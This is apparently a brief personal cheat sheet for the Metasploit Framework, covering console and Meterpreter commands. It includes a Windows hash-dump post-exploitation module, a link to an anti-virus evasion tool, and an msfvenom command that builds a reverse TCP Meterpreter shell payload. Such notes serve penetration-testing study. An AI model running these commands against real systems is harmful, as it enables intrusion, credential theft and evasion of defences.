# METASPLOIT

* [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) - the ultimate guide to the Metasploit Framework
* [Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion/) - generate metasploit payloads that bypass anti-virus solutions

Starting
--------
```
service postgresql start
msfdb init
msfconsole
```

Useful Metasploit Console Commands
----------------------------------
* [MSFconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)  
```
jobs
sessions -i 1
set session 1
```

Useful Meterpreter Commands
---------------------------
```
sysinfo
exit/quit
download/upload
edit
getpid
geuid
ps
kill
execute
migrate

```

Post-exploitation module: `run winenum` script.  
Windows hashes: `run post/windows/gather/smart_hashdump`  

* [Web Delivery explained](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) //tip: check if there's port added in the payload URL



Payload generating with msfvenom should be something like this...  
`msfvenom -p windows/meterpreter/reverse_tcp -f c LHOST=192.168.1.69 LPORT=4444`    
where -p is for payload, -f is for format (C in this case). Needs bad characters as well.
